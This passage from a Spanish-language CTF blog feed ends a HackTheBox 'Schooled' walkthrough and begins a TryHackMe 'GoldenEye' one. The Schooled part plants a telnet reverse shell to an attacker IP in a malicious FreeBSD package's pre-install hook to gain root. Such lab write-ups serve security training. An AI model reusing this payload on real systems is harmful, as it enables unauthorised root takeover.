&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;jamie@Schooled:~/packages $ sudo pkg update
Updating FreeBSD repository catalogue...
Fetching meta.conf: 100%    &lt;span class=&#34;m&#34;&gt;163&lt;/span&gt; B   0.2kB/s    00:01    
Fetching packagesite.txz: 100%    &lt;span class=&#34;m&#34;&gt;932&lt;/span&gt; B   0.9kB/s    00:01    
Processing entries: 100%
FreeBSD repository update completed. &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; packages processed.
All repositories are up to date.
jamie@Schooled:~/packages $ sudo pkg install bash
Updating FreeBSD repository catalogue...
FreeBSD repository is up to date.
All repositories are up to date.
The following &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; package&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; will be affected &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;of &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; checked&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:

Installed packages to be UPGRADED:
        bash: 5.1.4 -&amp;gt; 7.1.4

Number of packages to be upgraded: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;

&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; MiB to be downloaded.

Proceed with this action? &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;y/N&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: y
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;1/1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching bash-6.1.4.txz: 100%    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; MiB 127.4kB/s    00:12    
Checking integrity... &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; conflicting&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;1/1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Upgrading bash from 5.1.4 to 7.1.4...
pkg: duplicate annotation: binary, ignoring
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;1/1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Extracting bash-7.1.4:   0%
pkg: Directory //usr not specified in the manifest, skipping
pkg: Directory //usr/local not specified in the manifest, skipping
pkg: Directory //usr/local/man not specified in the manifest, skipping
pkg: Directory //usr/local/share not specified in the manifest, skipping
pkg: Directory //usr/local/libdata not specified in the manifest, skipping
pkg: Directory //usr/local/lib not specified in the manifest, skipping
pkg: Directory //usr/local/include not specified in the manifest, skipping
pkg: Directory //usr/local/bin not specified in the manifest, skipping
pkg: File //usr/local/bin/bashbug not specified in the manifest
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;1/1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Extracting bash-7.1.4: 100%
jamie@Schooled:~/packages $
jamie@Schooled:~ $ ls -lah /home/jamie/root.txt 
-rw-r--r--  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root  jamie    33B Apr  &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; 10:18 /home/jamie/root.txt
jamie@Schooled:~ $ cat root.txt &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; cut -c1-15
269e8ad27983a7b
jamie@Schooled:~ $
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;shell---root&#34;&gt;Shell - Root&lt;/h2&gt;
&lt;p&gt;Utilizamos el mismo procedimiento para crear un nuevo paquete y repositorio, los cambios fueron en &lt;code&gt;+MANIFEST&lt;/code&gt; donde agregamos una shell inversa y una version mayor a la ya instalada, este ultimo se agrego en &lt;code&gt;+COMPACT_MANIFEST&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;scripts&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;s2&#34;&gt;&amp;#34;pre-install&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i |telnet 10.10.14.145 1339 &amp;gt; /tmp/f&amp;#34;&lt;/span&gt;,
     ... , ...
  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Tras instalar el paquete logramos obtener una shell como &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;╭─kali@kali ~/htb/schooled/repo2/packages  
╰─➤  rlwrap nc -lvvp &lt;span class=&#34;m&#34;&gt;1339&lt;/span&gt;
listening on &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;any&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1339&lt;/span&gt; ...
connect to &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.14.145&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; from schooled.htb &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.10.234&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;13002&lt;/span&gt;
whoami&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;id&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;
root
&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;wheel&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;wheel&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;operator&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/usr/home/jamie/packages
&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /root
ls
.cache
.cshrc
.history
.k5login
.lesshst
.login
.profile
.shrc
.ssh
root.txt
scripts
cat root.txt &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; cut -c1-15
269e8ad27983a7b
cat /home/jamie/user.txt &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; cut -c1-15
ecf7c6d61bfc9c8
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/schooled/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/schooled/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>moodle</category>
            
          
            
              <category>xss</category>
            
          
            
              <category>pkg</category>
            
          
            
              <category>pkg repo</category>
            
          
            
              <category>freebsd</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
            
              <category>freebsd</category>
            
          
            
              <category>linux</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - GoldenEye</title>
        <link>https://sckull.github.io/posts/goldeneye/</link>
        <pubDate>Wed, 05 Aug 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Wed, 05 Aug 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/goldeneye/</guid>
        <description>GoldenEye es una maquina de TryHackMe, enfocada en la tematica de Golden Eye encontramos multiples usuarios los cuales utilizamos con Hydra en POP3 donde obtuvimos acceso y credenciales para Moodle que posteriormente nos devolvio a POP3 donde encontramos credenciales de administracion para Moodle donde luego explotamos una vulnerabilidad para obtener acceso.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;GoldenEye es una maquina de TryHackMe, enfocada en la tematica de Golden Eye encontramos multiples usuarios los cuales utilizamos con Hydra en POP3 donde obtuvimos acceso y credenciales para Moodle que posteriormente nos devolvio a POP3 donde encontramos credenciales de administracion para Moodle donde luego explotamos una vulnerabilidad para obtener acceso. Finalmente explotamos una vulnerabilidad en el Kernel de Linux para escalar privilegios.&lt;/p&gt;
&lt;h1 id=&#34;room&#34;&gt;Room&lt;/h1&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;strong&gt;Titulo&lt;/strong&gt;&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;&lt;a href=&#34;https://tryhackme.com/room/goldeneye&#34;&gt;GoldenEye&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Descripción&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;Bond, James Bond. A guided CTF.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;930&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_thm&#34; style=&#34;margin-bottom: 5px;&#34;&gt; &lt;a href=&#34;https://tryhackme.com/p/ben&#34;&gt;ben&lt;/a&gt; &lt;img src=&#34;https://tryhackme-badges.s3.amazonaws.com/ben.png&#34; class=&#34;user_maker_thm&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;goldeneye-part-1&#34;&gt;GOLDENEYE PART 1&lt;/h1&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto http (80). ssl (55006), pop3 (55007) y el puerto smtp (25) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Wed Aug  5 17:03:08 2020 as: nmap -sV -o mini_scan golden.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; golden.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.38.197&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.25s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;998&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
80/tcp open  http    Apache httpd 2.4.7 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Aug  5 17:03:58 2020 -- 1 IP address (1 host up) scanned in 50.07 seconds&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Wed Aug  5 17:02:54 2020 as: nmap -sV -p- -T5 -o big_scan golden.thm&lt;/span&gt;
Warning: 10.10.38.197 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; golden.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.38.197&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.25s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65449&lt;/span&gt; closed ports, &lt;span class=&#34;m&#34;&gt;82&lt;/span&gt; filtered ports
PORT      STATE SERVICE     VERSION
25/tcp    open  smtp        Postfix smtpd
80/tcp    open  http        Apache httpd 2.4.7 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
55006/tcp open  ssl/unknown
55007/tcp open  pop3        Dovecot pop3d

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Aug  5 17:16:03 2020 -- 1 IP address (1 host up) scanned in 789.07 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 80, en donde mencionan un directorio &lt;code&gt;/sev-home/&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_160933.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En el codigo del script que se ejecuta en la pagina encontramos un posible nombre de usuario y contraseña, en el comentario tambien indica que la contraseña esta codificada.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_161137.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos &lt;a href=&#34;https://gchq.github.io/CyberChef/&#34;&gt;&lt;strong&gt;CyberChef&lt;/strong&gt;&lt;/a&gt; para obtener en texto plano la contraseña.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_161309.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En el directorio &lt;code&gt;/sev-home/&lt;/code&gt; encontramos un panel simple de logeo.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_161449.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al ingresar con las credenciales que encontramos nos muestra un video con contenido en la pagina.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_161645.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En uno de los parrafos muestra el siguiente mensaje, en el que indican que devemos de enviar un correo a un supervisor calificado, y que el servicio de pop3 esta configurado en un puerto alto que seria el &lt;a href=&#34;#nmap&#34;&gt;&lt;strong&gt;55007&lt;/strong&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;Please email a qualified GNO supervisor to receive the online 
GoldenEye Operators Training to become an Administrator of 
the GoldenEye system

Remember, since security by obscurity is very effective, 
we have configured our pop3 service to run on a very high 
non-default port
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Además en el codigo fuente de la pagina encontramos otro posible nombre de usuario junto a otro que ya encontramos y que son &amp;ldquo;supervisores&amp;rdquo;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_162408.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;rustbustergobuster&#34;&gt;RUSTBUSTER/GOBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos en el directorio principal (/).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
